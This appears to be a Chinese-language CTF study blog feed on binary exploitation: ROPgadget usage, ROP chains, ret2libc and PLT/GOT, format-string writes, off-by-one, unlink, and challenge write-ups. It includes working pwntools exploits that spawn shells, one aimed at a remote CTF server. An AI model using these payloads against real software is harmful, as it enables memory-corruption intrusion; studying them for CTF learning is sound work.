<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">usage: ROPgadget [-h] [-v] [-c] [--binary &lt;binary&gt;] [--opcode &lt;opcodes&gt;]</span><br><span class="line">                 [--<span class="built_in">string</span> &lt;<span class="built_in">string</span>&gt;] [--memstr &lt;<span class="built_in">string</span>&gt;] [--depth &lt;nbyte&gt;]</span><br><span class="line">                 [--only &lt;key&gt;] [--filter &lt;key&gt;] [--range &lt;start-end&gt;]</span><br><span class="line">                 [--badbytes &lt;byte&gt;] [--rawArch &lt;arch&gt;] [--rawMode &lt;mode&gt;]</span><br><span class="line">                 [--rawEndian &lt;endian&gt;] [--re &lt;re&gt;] [--offset &lt;hexaddr&gt;]</span><br><span class="line">                 [--ropchain] [--thumb] [--console] [--norop] [--nojop]</span><br><span class="line">                 [--callPreceded] [--nosys] [--multibr] [--all] [--noinstr]</span><br><span class="line">                 [--dump] [--silent]</span><br></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">optional arguments:</span><br><span class="line">  -h, --help            show <span class="keyword">this</span> help message <span class="keyword">and</span> <span class="built_in">exit</span></span><br><span class="line">  -v, --version         Display the ROPgadget<span class="number">&#x27;</span>s version</span><br><span class="line">  -c, --checkUpdate     Checks <span class="keyword">if</span> a <span class="keyword">new</span> version is available</span><br><span class="line">  --binary &lt;binary&gt;     Specify a binary filename to analyze</span><br><span class="line">  --opcode &lt;opcodes&gt;    Search opcode in executable segment</span><br><span class="line">  --<span class="built_in">string</span> &lt;<span class="built_in">string</span>&gt;     Search <span class="built_in">string</span> in readable segment</span><br><span class="line">  --memstr &lt;<span class="built_in">string</span>&gt;     Search each byte in all readable segment</span><br><span class="line">  --depth &lt;nbyte&gt;       Depth <span class="keyword">for</span> search engine (<span class="keyword">default</span> <span class="number">10</span>)</span><br><span class="line">  --only &lt;key&gt;          Only show specific instructions</span><br><span class="line">  --filter &lt;key&gt;        Suppress specific mnemonics</span><br><span class="line">  --range &lt;start-end&gt;   Search between two addresses (<span class="number">0</span>x...<span class="number">-0</span>x...)</span><br><span class="line">  --badbytes &lt;byte&gt;     Rejects specific bytes in the gadget<span class="number">&#x27;</span>s address</span><br><span class="line">  --rawArch &lt;arch&gt;      Specify an arch <span class="keyword">for</span> a raw file</span><br><span class="line">  --rawMode &lt;mode&gt;      Specify a mode <span class="keyword">for</span> a raw file</span><br><span class="line">  --rawEndian &lt;endian&gt;  Specify an endianness <span class="keyword">for</span> a raw file</span><br><span class="line">  --re &lt;re&gt;             Regular expression</span><br><span class="line">  --offset &lt;hexaddr&gt;    Specify an offset <span class="keyword">for</span> gadget addresses</span><br><span class="line">  --ropchain            Enable the ROP chain generation</span><br><span class="line">  --thumb               Use the thumb mode <span class="keyword">for</span> the search engine (ARM only)</span><br><span class="line">  --console             Use an interactive console <span class="keyword">for</span> search engine</span><br><span class="line">  --norop               Disable ROP search engine</span><br><span class="line">  --nojop               Disable JOP search engine</span><br><span class="line">  --callPreceded        Only show gadgets which are call-preceded</span><br><span class="line">  --nosys               Disable SYS search engine</span><br><span class="line">  --multibr             Enable multiple branch gadgets</span><br><span class="line">  --all                 Disables the removal of duplicate gadgets</span><br><span class="line">  --noinstr             Disable the gadget instructions console printing</span><br><span class="line">  --dump                Outputs the gadget bytes</span><br><span class="line">  --silent              Disables printing of gadgets during analysis</span><br></pre></td></tr></table></figure>



<h3 id="简单的例子-1"><a href="#简单的例子-1" class="headerlink" title="简单的例子"></a>简单的例子</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v4; <span class="comment">// [esp+1Ch] [ebp-64h]</span></span><br><span class="line"></span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">  setvbuf(<span class="built_in">stdin</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;This time, no system() and NO SHELLCODE!!!&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;What do you plan to do?&quot;</span>);</span><br><span class="line">  gets(&amp;v4);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p><img src="/posts/c68c5dc4/image-20201104162146702.png" alt="image-20201104162146702"></p>
<p><img src="/posts/c68c5dc4/image-20201104162430363.png" alt="image-20201104162430363"></p>
<p><img src="/posts/c68c5dc4/image-20201104162507306.png" alt="image-20201104162507306"></p>
<p><img src="/posts/c68c5dc4/image-20201104162857614.png" alt="image-20201104162857614"></p>
<p>思路就是通过一系列gadgets，改变寄存器的参数然后再将rip指向int 0x80执行系统调用。</p>
<p>exp如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">sh = process(<span class="string">&#x27;./rop&#x27;</span>)</span><br><span class="line"></span><br><span class="line">pop_eax_ret = <span class="number">0x080bb196</span></span><br><span class="line">pop_edx_ecx_ebx_ret = <span class="number">0x0806eb90</span></span><br><span class="line">int_0x80 = <span class="number">0x08049421</span></span><br><span class="line">binsh = <span class="number">0x80be408</span></span><br><span class="line">payload = flat(</span><br><span class="line">    [<span class="string">b&#x27;A&#x27;</span> * <span class="number">112</span>, pop_eax_ret, <span class="number">0xb</span>, pop_edx_ecx_ebx_ret, <span class="number">0</span>, <span class="number">0</span>, binsh, int_0x80])</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>

<p>这里的ida显示的偏移不准确，需要用gdb调试<img src="/posts/c68c5dc4/image-20201104163900844.png" alt="image-20201104163900844"></p>
<p>同时,注意参数的入栈顺序。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">pop_edx_ecx_ebx_ret, <span class="number">0</span>, <span class="number">0</span>, binsh</span><br></pre></td></tr></table></figure>

<h2 id="ret2libc"><a href="#ret2libc" class="headerlink" title="ret2libc"></a>ret2libc</h2><h3 id="原理-2"><a href="#原理-2" class="headerlink" title="原理"></a>原理</h3><h4 id="PLT与GOT"><a href="#PLT与GOT" class="headerlink" title="PLT与GOT"></a>PLT与GOT</h4><p>PLT表(Procedure Linkage Table)过程连接表,在程序中以 .plt 节表示，该表处于代码段，每一个表项表示了一个与要重定位的函数相关的若干条指令，每个表项长度为 16 个字节，存储的是用于做延迟绑定的代码。调用一个外部函数的时候，会先去PLT中找，如果是非首次调用，就会直接跳转到相应的GOT表的表项，执行动态链接库里对应的函数。如果是首次，真正的函数地址会先被解析并填入相应的 GOT 表项，然后调用。</p>
<p>GOT表(Global Offset Table)全局偏移表，在程序中以 .got.plt 表示，该表处于数据段，每一个表项存储的都是一个地址，每个表项长度是当前程序的对应需要寻址长度（32位程序：4字节，64位程序：8字节）。</p>
<h4 id="简单例子"><a href="#简单例子" class="headerlink" title="简单例子"></a>简单例子</h4><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;hello&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;world&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>为了方便实验,将所有的保护都关掉.</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">gcc -m32 plt\&amp;got.c -g -z execstack -fno-stack-protector -no-pie -z norelro -o plt</span><br></pre></td></tr></table></figure>

<p><img src="/posts/c68c5dc4/image-20201104173407071.png" alt="image-20201104173407071"></p>
<p>首次调用puts函数时,首先跳转到puts函数在got.plt中记录位置</p>
<p><img src="/posts/c68c5dc4/image-20201105113447389.png" alt="image-20201105113447389"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">dword   双字 就是四个字节</span><br><span class="line">ptr     pointer缩写 即指针</span><br><span class="line">jmp   dword ptr [_GLOBAL_OFFSET_TABLE_+12]即跳转到内存0x8049724中低32位即0x80482c6.</span><br></pre></td></tr></table></figure>

<p><img src="/posts/c68c5dc4/image-20201105113807853.png" alt="image-20201105113807853"></p>
<p><img src="/posts/c68c5dc4/image-20201105114209230.png" alt="image-20201105114209230"></p>
<p>之后,跳转到.plt段首PLT0.解析puts的实际地址.</p>
<p><img src="/posts/c68c5dc4/image-20201105114436758.png" alt="image-20201105114436758"></p>
<p>解析完成后,将真实地址填入到got表项中并执行.</p>
<p><img src="/posts/c68c5dc4/image-20201105114919183.png" alt="image-20201105114919183"></p>
<p>第二次调用</p>
<p><img src="/posts/c68c5dc4/image-20201105115211598.png" alt="image-20201105115211598"></p>
<p>直接自 .got.plt 跳转到 puts 的真实地址,没有了第一次的解析地址过程.</p>
<ul>
<li><p>GOT 表位于.got 和.got.plt Ssection</p>
<ul>
<li>.got Section 存放外部全局变量的 GOT 表，非延迟绑定</li>
<li>.got.plt Section 存放外部函数的 GOT 表，例如 printf，采用延迟绑定.    </li>
</ul>
<table>
<thead>
<tr>
<th align="center">.got.plt(解析前)</th>
<th align="center">.got.plt(解析后)</th>
</tr>
</thead>
<tbody><tr>
<td align="center">.dynamic section 地址</td>
<td align="center">.dynamic section 地址</td>
</tr>
<tr>
<td align="center">link_map 地址</td>
<td align="center">link_map 地址</td>
</tr>
<tr>
<td align="center">_dl_runtime_resolve</td>
<td align="center">_dl_runtime_resolve</td>
</tr>
<tr>
<td align="center">puts@plt + 6</td>
<td align="center">puts</td>
</tr>
</tbody></table>
</li>
<li><p>.got.plt 前三项有特殊含义，从第四项开始保存引用的各个外部函数的 GOT 表项：</p>
<ul>
<li>第一项保存的是.dynamic section 的地址 (为动态链接提供信息，例如符号表、字符串表等)</li>
<li>第二项保存的是 link_map 结构地址 (链表，包含所有加载的共享库信息)</li>
<li>第三项保存了_dl_runtime_resolve 函数的地址 (用于解析外部函数符号的函数，解析完成后会直接执行该函数)</li>
</ul>
</li>
</ul>
<h4 id="ret2libc-1"><a href="#ret2libc-1" class="headerlink" title="ret2libc"></a>ret2libc</h4><p>基本的原理就是通过plt调用各种函数.在没有shellcode可写,程序中没有后门函数时可以通过已有的plt去调用动态连接库里的其他函数,如system(“/bin/sh”);可以修改got表项内容,如puts,下次调用puts的时候就会执行修改后的函数.</p>
]]></content>
      <categories>
        <category>pwn</category>
      </categories>
      <tags>
        <tag>stack</tag>
      </tags>
  </entry>
  <entry>
    <title>格式化字符串</title>
    <url>/posts/7fabda03/</url>
    <content><![CDATA[<h1 id="格式化字符串"><a href="#格式化字符串" class="headerlink" title="格式化字符串"></a>格式化字符串</h1><h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>在printf函数中，format字符串中有的参数，如果没有给出会自动访问在format之后的内存作为参数。</p>
<h3 id="实验说明"><a href="#实验说明" class="headerlink" title="实验说明"></a>实验说明</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> s[<span class="number">100</span>] = <span class="string">&quot;world&quot;</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;hello%s\n&quot;</span>,s);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;new format:&quot;</span>);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>, s);</span><br><span class="line">    <span class="built_in">printf</span>(s);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>进入调试，首先可以看到正常的printf函数调用：</p>
<a id="more"></a>

<p><img src="/posts/7fabda03/image-20201113225150355.png" alt="image-20201113225150355"></p>
<p>可以看到，对于format，实际上在是存在栈上其偏移6的父函数栈帧上的即格式化字符串的偏移为6。与正常的函数调用时的参数关系一致。</p>
<p><img src="/posts/7fabda03/IMG_0044.PNG" alt="IMG_0044"></p>
<p>如果是缺少相应的参数，printf函数会从偏移1开始匹配参数。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">aaaa.%x.%x.%x.%x.%x.%x.%x.%x</span><br></pre></td></tr></table></figure>

<p><img src="/posts/7fabda03/image-20201113230619688.png" alt="image-20201113230619688"></p>
<p><img src="/posts/7fabda03/image-20201113230645900.png" alt="image-20201113230645900"></p>
<p><strong>这样的方法可以用来寻找格式化字符串的偏移量</strong></p>
<p><strong>上述实验是32位，和64位中区别在于，64位优先将参数传入6个寄存器中。</strong></p>
<h2 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h2><p>灵活使用格式化字符串的格式字符，可以做到任意地址的读写。</p>
<p>常用到的有：</p>
<ul>
<li>%x 将参数作为无符号以十六进制表示的整数打印</li>
<li>%p 打印地址</li>
<li>%s 将参数作为字符串地址，打印相应字符串（如果参数指向的不是一个字符串会造成程序崩溃）</li>
<li>%n 将参数作为地址，修改相应地址的内容。用于任意地址的写。</li>
</ul>
<p><strong>pwntools中有fmtstr_payload可以方便的构造任意地址写的payload</strong></p>
<h3 id="注意事项"><a href="#注意事项" class="headerlink" title="注意事项"></a>注意事项</h3><p>在对任意地址写的时候，如果地址较低，\x00会造成格式化字符串的截断，无法达到预期效果。</p>
<h4 id="一个例子"><a href="#一个例子" class="headerlink" title="一个例子"></a>一个例子</h4><p><img src="/posts/7fabda03/image-20201113232149244.png" alt="image-20201113232149244"></p>
<p><img src="/posts/7fabda03/image-20201113232249593.png" alt="image-20201113232249593"></p>
<p><img src="/posts/7fabda03/image-20201113232302791.png" alt="image-20201113232302791"></p>
<p>显然存在格式化字符串漏洞，只需要将bss段的变量改为非0，执行后门函数即可。</p>
<p>通过上述方法可以得到偏移为10.</p>
<p>exp如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>,<span class="string">&#x27;splitw&#x27;</span>,<span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line">p = process(<span class="string">&quot;./pwn(2)&quot;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">addr = <span class="number">0x60107c</span></span><br><span class="line">payload = <span class="string">b&#x27;aaa&#x27;</span>+<span class="string">b&quot;%11$n&quot;</span>+p64(addr)</span><br><span class="line">p.send(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>这里将要修改的地址置后，是p64(addr)的\x00会造成截断，如果payload为<code> p64(addr)+b&#39;%10$n&#39;</code></p>
<p>格式化字符串不会读到‘%10$n’</p>
<p>因此将地址之后，填满64位的内存，将地址的偏移构造为11.将0x60107c的内容改为3，执行sh函数。</p>
]]></content>
      <categories>
        <category>pwn</category>
      </categories>
      <tags>
        <tag>fmtstr</tag>
      </tags>
  </entry>
  <entry>
    <title>off by one</title>
    <url>/posts/a1c78337/</url>
    <content><![CDATA[<h1 id="off-by-one"><a href="#off-by-one" class="headerlink" title="off by one"></a>off by one</h1><p>off-by-one 是指单字节缓冲区溢出，这种漏洞的产生往往与边界验证不严和字符串操作有关，当然也不排除写入的 size 正好就只多了一个字节的情况。总之，是输入的范围超出申请的缓冲区的大小。</p>
<a id="more"></a>

<p>常见的边界验证不严谨有：</p>
<ul>
<li>使用循环语句向堆块中写入数据时，循环的次数设置错误（这在 C 语言初学者中很常见）导致多写入了一个字节。</li>
<li>字符串操作不合适</li>
</ul>
<p>off by one漏洞可以出现在各种缓冲区中，但ctf中常用于堆的题目。因此，主要是说明堆上的off by one。</p>
<h2 id="利用方向"><a href="#利用方向" class="headerlink" title="利用方向"></a>利用方向</h2><p>根据溢出字节是否可控分为两种情况：</p>
<ul>
<li>溢出字节为可控制任意字节：通过修改大小造成块结构之间出现重叠，从而泄露其他块数据，或是覆盖其他块数据。也可使用 NULL 字节溢出的方法</li>
<li>溢出字节为 NULL 字节：在 size 为 0x100 的时候，溢出 NULL 字节可以使得 <code>prev_in_use</code> 位被清，这样前块会被认为是 free 块。（1） 这时可以选择使用 unlink 方法（见 unlink 部分）进行处理。（2） 另外，这时 <code>prev_size</code> 域就会启用，就可以伪造 <code>prev_size</code> ，从而造成块之间发生重叠。此方法的关键在于 unlink 的时候没有检查按照 <code>prev_size</code> 找到的块的大小与<code>prev_size</code> 是否一致。</li>
</ul>
<p>这里的0x100是一个例子，原理是，申请chunk时对于申请大小不是2*size_sz的会自动补全，同时对于正在使用的chunk来说，<code>prev_size</code>是没有意义的，因此是与前一块chunk共用。</p>
<p>size为0x100，用户申请的大小是0xf8。补到0x100，由于chunk头需要0x10的空间，因此正常情况，用户的输入是可以到下一个chunk 的<code>prev_size</code>的。这时候溢出的null字节<code>\x00</code>会覆盖size的最低字节即 <code>prev_in_use</code>。</p>
<p>一个简单实验说明chunk的实际size大小。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">void</span> *chunk1,*chunk2;</span><br><span class="line">    chunk1 = <span class="built_in">malloc</span>(<span class="number">56</span>);</span><br><span class="line">    chunk2 = <span class="built_in">malloc</span>(<span class="number">48</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="/posts/a1c78337/image-20201116122936249.png" alt="image-20201116122936249"></p>
<p>无论是哪种情况，off by one本身很难实现攻击，一般只是为之后的攻击创造条件。</p>
<p>如实现堆交叉之后的UAF、修改<code>prev_in_use</code>之后使用unlink等。</p>
]]></content>
      <categories>
        <category>pwn</category>
      </categories>
      <tags>
        <tag>heap</tag>
        <tag>offbyone</tag>
      </tags>
  </entry>
  <entry>
    <title>unlink原理</title>
    <url>/posts/c61eeb38/</url>
    <content><![CDATA[<h1 id="unlink-原理"><a href="#unlink-原理" class="headerlink" title="unlink 原理"></a>unlink 原理</h1><p>我们在利用 unlink 所造成的漏洞时，其实就是对 chunk 进行内存布局（伪造chunk等），然后借助 unlink 操作来达成修改指针的效果。</p>
<a id="more"></a>

<h2 id="unlink的过程"><a href="#unlink的过程" class="headerlink" title="unlink的过程"></a>unlink的过程</h2><p>unlink的目的是把一个双向链表中的空闲块拿出来。常用到的是在free当前chunk时，与物理相邻的chunk进行合并为一个大的chunk的情况。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> unlink(P, BK, FD)                                                     \</span></span><br><span class="line">&#123;                                                                             \</span><br><span class="line">  BK = P-&gt;bk;                                                                 \</span><br><span class="line">  FD = P-&gt;fd;                                                                 \</span><br><span class="line">  FD-&gt;bk = BK;                                                                \</span><br><span class="line">  BK-&gt;fd = FD;                                                                \</span><br><span class="line">&#125;                                                                             \</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>基本过程如图所示：</p>
<p><img src="/posts/c61eeb38/unlink_smallbin_intro.png" alt="img"></p>
<p>结果就是P和BK合并成一块chunk，其chunk头部在BK。</p>
<p>最开始的unlink如上代码所示，是没有进行检查。</p>
<p>而现在的unlink会对chunk 的 size 检查和双向链表检查。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 由于 P 已经在双向链表中，所以有两个地方记录其大小，所以检查一下其大小是否一致(size检查)</span></span><br><span class="line"><span class="keyword">if</span> (__builtin_expect (chunksize(P) != prev_size (next_chunk(P)), <span class="number">0</span>))      \</span><br><span class="line">      malloc_printerr (<span class="string">&quot;corrupted size vs. prev_size&quot;</span>);               \</span><br><span class="line"><span class="comment">// 检查 fd 和 bk 指针(双向链表完整性检查)</span></span><br><span class="line"><span class="keyword">if</span> (__builtin_expect (FD-&gt;bk != P || BK-&gt;fd != P, <span class="number">0</span>))                      \</span><br><span class="line">  malloc_printerr (check_action, <span class="string">&quot;corrupted double-linked list&quot;</span>, P, AV);  \</span><br><span class="line"></span><br><span class="line">  <span class="comment">// largebin 中 next_size 双向链表完整性检查 </span></span><br><span class="line">              <span class="keyword">if</span> (__builtin_expect (P-&gt;fd_nextsize-&gt;bk_nextsize != P, <span class="number">0</span>)              \</span><br><span class="line">                || __builtin_expect (P-&gt;bk_nextsize-&gt;fd_nextsize != P, <span class="number">0</span>))    \</span><br><span class="line">              malloc_printerr (check_action,                                      \</span><br><span class="line">                               <span class="string">&quot;corrupted double-linked list (not small)&quot;</span>,    \</span><br><span class="line">                               P, AV);</span><br></pre></td></tr></table></figure>

<p>假设在没有检查的情况下，以32位为例子。</p>
<p><img src="/posts/c61eeb38/image-20201116175232943.png" alt="image-20201116175232943"></p>
<p>堆的状态如图，此时free（Q）。</p>
<ul>
<li>glibc 判断这个块是 small chunk</li>
<li>判断前向合并，发现前一个 chunk 处于使用状态，不需要前向合并</li>
<li>判断后向合并，发现后一个 chunk 处于空闲状态，需要合并</li>
<li>继而对 Nextchunk 采取 unlink 操作</li>
</ul>
<p>unlink的结果：</p>
<ul>
<li>FD=N-&gt;fd（即FD=a）</li>
<li>BK=N-&gt;bk（BK=b）</li>
<li>FD-&gt;bk = BK（<code>*（a+4*3）=b</code>）</li>
<li>BK-&gt;fd = FD（<code>*(b+4*2)=a</code>）</li>
</ul>
<p>如果能够修改N的fd和bk，如果将fd修改为目标地址-12（如某got）bk修改为期望的值（如另一个地址）。那么执通过FD-&gt;bk = BK就能做到修改目标地址的值的目的。</p>
<h3 id="绕过检查"><a href="#绕过检查" class="headerlink" title="绕过检查"></a>绕过检查</h3><p>但是由于会检查fd和bk指针，上述的修改方法就不成立了，使用伪造的方法。</p>
<p>首先我们通过覆盖，将 nextchunk 的 FD 指针指向了 fakeFD，将 nextchunk 的 BK 指针指向了 fakeBK 。那么为了通过验证，我们需要</p>
<ul>
<li><code>fakeFD -&gt; bk == P</code> &lt;=&gt; <code>*(fakeFD + 12) == P</code></li>
<li><code>fakeBK -&gt; fd == P</code> &lt;=&gt; <code>*(fakeBK + 8) == P</code></li>
</ul>
<p>当满足上述两式时，可以进入 Unlink 的环节，进行如下操作：</p>
<ul>
<li><code>fakeFD -&gt; bk = fakeBK</code> &lt;=&gt; <code>*(fakeFD + 12) = fakeBK</code></li>
<li><code>fakeBK -&gt; fd = fakeFD</code> &lt;=&gt; <code>*(fakeBK + 8) = fakeFD</code></li>
</ul>
<p>如果让 fakeFD + 12 和 fakeBK + 8 指向同一个指向P的指针，那么：</p>
<ul>
<li><code>*P = P - 8</code></li>
<li><code>*P = P - 12</code></li>
</ul>
<p>最终将p指针指向了比自己低12位的地址。</p>
<h3 id="利用思路"><a href="#利用思路" class="headerlink" title="利用思路"></a>利用思路</h3><p>条件：</p>
<ul>
<li><p>UAF ，可修改 free 状态下 smallbin 或是 unsorted bin 的 fd 和 bk 指针</p>
</li>
<li><p>已知位置存在一个指针指向可进行 UAF 的 chunk（通常是一个存储申请chunk的数组）</p>
</li>
</ul>
<p>条件并不绝对，也可以是通过溢出修改下一个chunk的prev_in_use、prev_size，unlink前一个伪造的chunk。</p>
<p>本质上，是将准备的free的chunk的物理相邻的free的chunk的fd、bk指针修改。</p>
<p>有了上述条件之后，那么就可以修改数组内容，如果有类似修改chunk内容的函数，就可以做到任意地址写。</p>
]]></content>
      <categories>
        <category>pwn</category>
      </categories>
      <tags>
        <tag>heap</tag>
        <tag>unlink</tag>
      </tags>
  </entry>
  <entry>
    <title>unlink练习</title>
    <url>/posts/6cd531ad/</url>
    <content><![CDATA[<h1 id="unlink练习"><a href="#unlink练习" class="headerlink" title="unlink练习"></a>unlink练习</h1><p>记录ctf-wiki上的unlink练习题。</p>
<a id="more"></a>

]]></content>
      <categories>
        <category>pwn</category>
      </categories>
      <tags>
        <tag>heap</tag>
        <tag>unlink</tag>
      </tags>
  </entry>
  <entry>
    <title>攻防世界pwn进阶</title>
    <url>/posts/5600bec/</url>
    <content><![CDATA[<h1 id="攻防世界——pwn进阶"><a href="#攻防世界——pwn进阶" class="headerlink" title="攻防世界——pwn进阶"></a>攻防世界——pwn进阶</h1><h2 id="反应釜开关控制"><a href="#反应釜开关控制" class="headerlink" title="反应釜开关控制"></a>反应釜开关控制</h2><p><img src="/posts/5600bec/image-20201123091050404.png" alt="image-20201123091050404"></p>
<h3 id="代码分析"><a href="#代码分析" class="headerlink" title="代码分析"></a>代码分析</h3><p>先查看一下保护。</p>
<p><img src="/posts/5600bec/image-20201123091430114.png" alt="image-20201123091430114"></p>
<p>只开启了堆栈不可执行。</p>
<p><img src="/posts/5600bec/image-20201123091242758.png" alt="image-20201123091242758"></p>
<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201123231711816.png" alt="image-20201123231711816"></p>
<p><img src="/posts/5600bec/image-20201123091319181.png" alt="image-20201123091319181"></p>
<p><img src="/posts/5600bec/image-20201123091712759.png" alt="image-20201123091712759"></p>
<p>这道题感觉应该是不给附件中的可执行文件盲打才对，不然知道可执行文件用ida反编译，就知道是很就简单的栈溢出。通过三次栈溢出，覆盖返回地址跳转到后门函数。</p>
<h3 id="思路及利用"><a href="#思路及利用" class="headerlink" title="思路及利用"></a>思路及利用</h3><p>首先保护只有堆栈不可执行。同时是使用gets函数获取输入。那么就可以随意的进行栈溢出。那么思路就很简单了。先通过栈溢出覆盖返回地址，从main跳到easy，从easy跳到normal，从normal跳到shell。</p>
<p>需要注意的是，ida显示的与rbp的距离有时候是不准确的，最好是通过gdb动态调试得到。这里为了方便，直接用来ida显示，成功得到shell。</p>
<p>exp如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"><span class="comment"># p = process(&#x27;./reactionkettle&#x27;)</span></span><br><span class="line">p = remote(<span class="string">&#x27;220.249.52.133&#x27;</span>,<span class="number">49151</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;is:&#x27;</span>)</span><br><span class="line">easy = p.recv(<span class="number">8</span>)</span><br><span class="line">easy =  <span class="built_in">int</span>(easy,<span class="number">16</span>) </span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x208</span>+p64(easy)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;is:&#x27;</span>)</span><br><span class="line">normal = p.recv(<span class="number">8</span>)</span><br><span class="line">normal  =  <span class="built_in">int</span>(normal,<span class="number">16</span>) </span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x188</span>+p64(normal)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;is:&#x27;</span>)</span><br><span class="line">shell = p.recv(<span class="number">8</span>)</span><br><span class="line">shell = <span class="built_in">int</span>(shell,<span class="number">16</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x108</span>+p64(shell)</span><br><span class="line">p.sendafter(<span class="string">&#x27;&gt;&#x27;</span>,payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<h2 id="dice-game"><a href="#dice-game" class="headerlink" title="dice_game"></a>dice_game</h2><p><img src="/posts/5600bec/image-20201123094300324.png" alt="image-20201123094300324"></p>
<h3 id="代码分析-1"><a href="#代码分析-1" class="headerlink" title="代码分析"></a>代码分析</h3><p>惯例先checksec一下</p>
<p><img src="/posts/5600bec/image-20201123094345375.png" alt="image-20201123094345375"></p>
<p>通过ida反编译阅读源码</p>
<p><img src="/posts/5600bec/image-20201123094603206.png" alt="image-20201123094603206"></p>
<p><img src="/posts/5600bec/image-20201123094616274.png" alt="image-20201123094616274"></p>
<p><img src="/posts/5600bec/image-20201123094627108.png" alt="image-20201123094627108"></p>
<p>可以看出，这是一个骰子游戏。连续猜对50次就可以得到flag。</p>
<p>通过分析栈可以知道，输入的name是可以覆盖掉seed的。</p>
<h3 id="思路及利用-1"><a href="#思路及利用-1" class="headerlink" title="思路及利用"></a>思路及利用</h3><p>计算机的随机数都是伪随机数，种子一样时，rand函数会提供一样的数。所以需要控制seed的值。使用name覆盖seed。</p>
<p>需要注意的是，由于exp使用python编写，但这里需要用到c的函数。需要用上一点混合编程的技巧。</p>
<p>exp如下：</p>
